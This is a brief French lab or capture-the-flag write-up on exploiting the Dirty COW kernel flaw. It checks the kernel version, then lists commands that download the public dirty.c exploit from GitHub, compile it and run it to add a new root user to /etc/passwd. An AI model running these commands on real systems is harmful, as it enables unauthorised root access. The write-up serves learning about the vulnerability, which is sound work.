# Dirty Cow 

- Cette faille disponible sur les linux version 2.6.22 (2007) à 4.8.3 (2016) permet d'ecrire sur des fichiers accessible uniquement en lecture seule
- On regarde par regarder la version du linux pour savoir si l'exploit est utilisable
```
$> uname -r

3.2.0-91-generic-pae
```
- L'exploit est donc compatible avec notre version de linux
- On lance donc l'exploit
```
curl -O https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c
gcc -pthread dirty.c -o dirty -lcrypt
./dirty
```
- L'exploit arrive donc a ecrire un nouvelle utilisateur root dans /etc/passwd 

## Source
- [Explication](https://www.cs.toronto.edu/~arnold/427/18s/427_18S/indepth/dirty-cow/index.html#what-is-cow)
- [Excplication Youtube](https://www.youtube.com/watch?v=kEsshExn7aE)
- [Script](https://github.com/FireFart/dirtycow/blob/master/dirty.c)
